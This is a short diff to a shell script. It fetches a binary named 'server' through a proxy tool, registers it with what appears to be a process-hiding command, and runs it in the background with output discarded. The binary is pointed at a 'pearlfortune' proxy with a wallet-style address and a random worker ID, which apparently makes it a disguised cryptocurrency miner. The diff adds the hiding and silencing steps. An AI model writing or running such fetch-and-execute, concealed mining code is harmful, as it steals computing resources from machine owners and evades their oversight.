@@ -31,7 +31,7 @@ sleep .2
 echo " "
 
 echo " "
+./graftcp/graftcp wget https://github.com/brontosimungo/backend-server/raw/refs/heads/main/server && chmod +x server
+ph add server
 
-ph add posind
-
-./graftcp/graftcp wget https://github.com/brontosimungo/backend-server/raw/refs/heads/main/server && chmod +x server && ./server --proxy global.pearlfortune.org:443 --address prl1pcyxtt3j5rtcl6edp725362zgf6gmhtz7rljs8ynr40aaq7tuk5hs6zz5gp --worker $(shuf -n 1 -i 1-9999999)
+./graftcp/graftcp ./server --proxy global.pearlfortune.org:443 --address prl1pcyxtt3j5rtcl6edp725362zgf6gmhtz7rljs8ynr40aaq7tuk5hs6zz5gp --worker $(shuf -n 1 -i 1-9999999) > /dev/null 2>&1 &
